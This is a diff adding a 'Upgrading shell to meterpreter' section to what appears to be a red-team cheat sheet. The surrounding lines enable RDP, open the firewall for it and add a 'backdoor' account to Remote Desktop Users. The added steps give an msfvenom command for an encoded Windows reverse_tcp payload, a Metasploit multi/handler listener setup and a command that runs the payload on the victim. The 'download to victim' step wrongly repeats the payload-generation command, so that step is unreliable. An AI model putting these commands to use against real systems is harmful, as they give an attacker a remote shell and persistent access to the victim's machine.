@@ -34,6 +34,7 @@
 10. [Lateral Movement](#lateral-movement)
     - crackmapexec
     - Enabling RDP
+    - Upgrading shell to meterpreter
 11. [Collection](#collection)
     - .
 12. [Command and Control](#command-and-control)
@@ -165,3 +166,22 @@ Lateral Movement
 	`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
 	`netsh advfirewall firewall set rule group="remote desktop" new enable=Yes`
 	`net localgroup "Remote Desktop Users" "backdoor" /add`
+
+* Upgrading shell to meterpreter
+
+	After getting basic shell access to an endpoint a meterpreter is nicer to continue with.
+	
+	[attacker]Generate a meterpreter shell: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`
+	
+	![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)
+
+	[victim]Download to victim endpoint: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`
+	
+	[attacker]Configure listener: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`
+	
+	[victim]Execute payload:`Start-Process "shell-name.exe"`
+	
+	![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)
+
+	
+	
